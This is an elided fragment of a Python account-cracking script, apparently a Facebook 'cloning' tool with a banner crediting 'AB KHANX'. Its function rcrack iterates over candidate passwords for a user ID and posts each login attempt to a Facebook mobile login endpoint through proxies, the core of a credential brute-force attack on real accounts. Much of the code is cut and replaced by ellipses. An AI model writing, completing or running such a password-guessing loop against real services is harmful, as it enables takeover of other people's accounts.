...
logo ="""\033[1;32m
        ...
        \033[1;32m ##     ##     ######      ###### 
\033[1;32m[+]==============================================
\033[1;32m[+] \033[1;33mCREATED BY   :  \033[1;33mAB KHANX
...
def rcrack(uid,pwx,tl):
    ...
    try:
        for ps in pwx:
            ...
            lo = session.post('https://m.alpha.facebook.com/login/device-based/regular/login/?refsrc',data=log_data,headers=header_freefb,proxies=proxs).text
